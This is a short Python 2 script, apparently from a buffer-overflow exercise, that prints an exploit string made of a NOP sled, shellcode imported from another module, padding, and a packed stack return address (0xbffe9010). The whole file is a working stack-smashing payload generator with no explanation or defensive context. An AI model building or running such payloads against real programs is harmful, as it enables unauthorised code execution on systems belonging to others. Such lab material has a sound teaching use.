from shellcode import shellcode
from struct import pack

def main():
	print "\x90"*256 + shellcode + "\x90"*757 + pack("<I", 0xbffe9010)

if __name__ == '__main__':
	main()
